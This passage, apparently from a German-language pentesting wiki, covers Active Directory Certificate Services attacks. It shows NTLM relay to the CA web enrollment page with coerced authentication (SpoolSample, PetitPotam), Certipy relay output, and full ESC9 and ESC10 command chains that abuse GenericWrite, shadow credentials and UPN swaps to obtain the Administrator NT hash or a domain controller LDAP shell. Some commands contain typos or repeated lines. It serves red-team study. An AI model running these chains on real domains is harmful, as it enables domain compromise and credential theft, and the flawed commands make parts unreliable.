rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Missbrauch mit [Certipy](https://github.com/ly4k/Certipy)

Die Anforderung eines Zertifikats wird standardmäßig von Certipy basierend auf der Vorlage `Machine` oder `User` erstellt, die durch das Enden des Kontonamens mit `$` bestimmt wird. Die Spezifikation einer alternativen Vorlage kann durch die Verwendung des Parameters `-template` erreicht werden.

Eine Technik wie [PetitPotam](https://github.com/ly4k/PetitPotam) kann dann eingesetzt werden, um die Authentifizierung zu erzwingen. Bei der Arbeit mit Domänencontrollern ist die Spezifikation von `-template DomainController` erforderlich.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Keine Sicherheitserweiterung - ESC9 <a href="#id-5485" id="id-5485"></a>

### Erklärung

Der neue Wert **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) für **`msPKI-Enrollment-Flag`**, auch als ESC9 bezeichnet, verhindert das Einbetten der **neuen Sicherheitserweiterung `szOID_NTDS_CA_SECURITY_EXT`** in einem Zertifikat. Diese Flagge wird relevant, wenn `StrongCertificateBindingEnforcement` auf `1` (die Standardeinstellung) gesetzt ist, im Gegensatz zu einer Einstellung von `2`. Ihre Bedeutung wird in Szenarien erhöht, in denen eine schwächere Zertifikatabbildung für Kerberos oder Schannel ausgenutzt werden könnte (wie bei ESC10), da das Fehlen von ESC9 die Anforderungen nicht ändern würde.

Die Bedingungen, unter denen die Einstellung dieser Flagge signifikant wird, umfassen:

- `StrongCertificateBindingEnforcement` ist nicht auf `2` eingestellt (wobei der Standardwert `1` ist), oder `CertificateMappingMethods` enthält die `UPN`-Flagge.
- Das Zertifikat ist mit der `CT_FLAG_NO_SECURITY_EXTENSION`-Flagge in der Einstellung `msPKI-Enrollment-Flag` markiert.
- Ein Client-Authentifizierungs-EKU wird durch das Zertifikat angegeben.
- `GenericWrite`-Berechtigungen sind über ein beliebiges Konto verfügbar, um ein anderes zu kompromittieren.

### Missbrauchsszenario

Angenommen, `John@corp.local` hat `GenericWrite`-Berechtigungen über `Jane@corp.local`, mit dem Ziel, `Administrator@corp.local` zu kompromittieren. Die `ESC9`-Zertifikatvorlage, für die `Jane@corp.local` berechtigt ist, sich einzuschreiben, ist mit der `CT_FLAG_NO_SECURITY_EXTENSION`-Flagge in ihrer `msPKI-Enrollment-Flag`-Einstellung konfiguriert.

Zunächst wird der Hash von `Jane` mithilfe von Shadow Credentials erlangt, dank `Johns` `GenericWrite`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Anschließend wird `Jane`'s `userPrincipalName` absichtlich auf `Administrator` geändert, wobei der Domänenteil `@corp.local` ausgelassen wird:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Diese Änderung verstößt nicht gegen die Einschränkungen, da `Administrator@corp.local` weiterhin als `userPrincipalName` von `Administrator` eindeutig bleibt.

Anschließend wird das als verwundbar markierte Zertifikatstemplate `ESC9` als `Jane` angefordert:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Es wird festgestellt, dass das Zertifikat `userPrincipalName` den Wert `Administrator` widerspiegelt, ohne eine "object SID".

Das `userPrincipalName` von `Jane` wird dann auf ihren ursprünglichen Wert `Jane@corp.local` zurückgesetzt:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Der Versuch der Authentifizierung mit dem ausgestellten Zertifikat ergibt nun den NT-Hash von `Administrator@corp.local`. Der Befehl muss `-domain <domain>` enthalten, da das Zertifikat keine Domänenangabe enthält:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Schwache Zertifikat-Zuordnungen - ESC10

### Erklärung

Zwei Registrierungsschlüsselwerte auf dem Domänencontroller werden von ESC10 referenziert:

* Der Standardwert für `CertificateMappingMethods` unter `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` ist `0x18` (`0x8 | 0x10`), zuvor auf `0x1F` gesetzt.
* Die Standardeinstellung für `StrongCertificateBindingEnforcement` unter `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` ist `1`, zuvor `0`.

**Fall 1**

Wenn `StrongCertificateBindingEnforcement` als `0` konfiguriert ist.

**Fall 2**

Wenn `CertificateMappingMethods` das `UPN`-Bit (`0x4`) enthält.

### Missbrauchsfall 1

Mit `StrongCertificateBindingEnforcement` konfiguriert als `0`, kann ein Konto A mit `GenericWrite`-Berechtigungen ausgenutzt werden, um jedes Konto B zu kompromittieren.

Beispielsweise, wenn `GenericWrite`-Berechtigungen über `Jane@corp.local` verfügen, zielt ein Angreifer darauf ab, `Administrator@corp.local` zu kompromittieren. Das Verfahren ähnelt ESC9 und ermöglicht die Verwendung beliebiger Zertifikatvorlagen.

Zunächst wird der Hash von `Jane` unter Ausnutzung des `GenericWrite` mit Schattenanmeldeinformationen abgerufen.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Anschließend wird das `userPrincipalName` von `Jane` in `Administrator` geändert, wobei absichtlich der Teil `@corp.local` ausgelassen wird, um eine Einschränkungsverletzung zu vermeiden.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Nachfolgend wird ein Zertifikat zur Aktivierung der Client-Authentifizierung als `Jane` angefordert, unter Verwendung der Standard `Benutzer`-Vorlage.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'s `userPrincipalName` wird dann auf seinen Ursprung, `Jane@corp.local`, zurückgesetzt.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Die Authentifizierung mit dem erhaltenen Zertifikat liefert den NT-Hash von `Administrator@corp.local`, was die Angabe der Domäne im Befehl erforderlich macht, da die Domänendetails im Zertifikat fehlen.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Missbrauchsfall 2

Mit den `CertificateMappingMethods`, die das `UPN`-Bit-Flag (`0x4`) enthalten, kann ein Konto A mit `GenericWrite`-Berechtigungen jedes Konto B kompromittieren, das über keine `userPrincipalName`-Eigenschaft verfügt, einschließlich Maschinenkonten und des integrierten Domänenadministrators `Administrator`.

Hier ist das Ziel, `DC$@corp.local` zu kompromittieren, beginnend mit dem Erhalt des Hashes von `Jane` über Shadow Credentials und unter Ausnutzung des `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`s `userPrincipalName` wird dann auf `DC$@corp.local` gesetzt.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Ein Zertifikat für die Client-Authentifizierung wird als `Jane` unter Verwendung der Standard `Benutzer`-Vorlage angefordert.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`s `userPrincipalName` wird nach diesem Prozess auf seinen Ursprungszustand zurückgesetzt.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Um über Schannel zu authentifizieren, wird die Option `-ldap-shell` von Certipy verwendet, die den Authentifizierungserfolg als `u:CORP\DC$` angibt.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Durch die LDAP-Shell ermöglichen Befehle wie `set_rbcd` Angriffe auf die ressourcenbasierte eingeschränkte Delegierung (RBCD), die potenziell den Domänencontroller gefährden.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Diese Schwachstelle betrifft auch Benutzerkonten ohne `userPrincipalName` oder bei denen es nicht mit dem `sAMAccountName` übereinstimmt, wobei der Standardwert `Administrator@corp.local` aufgrund seiner erhöhten LDAP-Berechtigungen und dem Fehlen eines `userPrincipalName` standardmäßig ein Hauptziel ist.

## Kompromittierung von Forests mit Zertifikaten im Passiv

### Brechen von Forest Trusts durch kompromittierte CAs

Die Konfiguration für die **cross-forest enrollment** ist relativ einfach. Das **Root-CA-Zertifikat** aus dem Ressourcen-Forest wird von Administratoren an die Kontoforests **veröffentlicht**, und die **Enterprise-CA-Zertifikate** aus dem Ressourcen-Forest werden den `NTAuthCertificates`- und AIA-Containern in jedem Kontoforest **hinzugefügt**. Um es klar auszudrücken, gewährt diese Anordnung dem **CA im Ressourcen-Forest die vollständige Kontrolle** über alle anderen Forests, für die er PKI verwaltet. Sollte dieser CA von Angreifern **kompromittiert werden**, könnten Zertifikate für alle Benutzer sowohl in den Ressourcen- als auch in den Kontoforests **von ihnen gefälscht werden**, wodurch die Sicherheitsgrenze des Forests durchbrochen wird.

### Enrollment-Privilegien für externe Prinzipale gewährt

In Multi-Forest-Umgebungen ist Vorsicht geboten bei Enterprise-CAs, die **Zertifikatvorlagen veröffentlichen**, die es **Authentifizierten Benutzern oder externen Prinzipalen** (Benutzer/Gruppen extern zum Forest, zu dem die Enterprise-CA gehört) **Einschreibungs- und Bearbeitungsrechte** gewähren.\
Bei der Authentifizierung über eine Trust-Beziehung wird die **SID der Authentifizierten Benutzer** vom AD zum Token des Benutzers hinzugefügt. Somit könnte, wenn eine Domäne eine Enterprise-CA mit einer Vorlage besitzt, die **Authentifizierten Benutzern Einschreibungsrechte gewährt**, eine Vorlage potenziell von einem Benutzer aus einem anderen Forest **eingeschrieben werden**. Ebenso, wenn **Einschreibungsrechte explizit einem externen Prinzipal durch eine Vorlage gewährt werden**, wird eine **cross-forest Zugriffssteuerungsbeziehung erstellt**, die es einem Prinzipal aus einem Forest ermöglicht, sich in eine Vorlage aus einem anderen Forest **einzuschreiben**.

Beide Szenarien führen zu einer **Erhöhung der Angriffsfläche** von einem Forest zum anderen. Die Einstellungen der Zertifikatvorlage könnten von einem Angreifer ausgenutzt werden, um zusätzliche Privilegien in einer fremden Domäne zu erlangen.
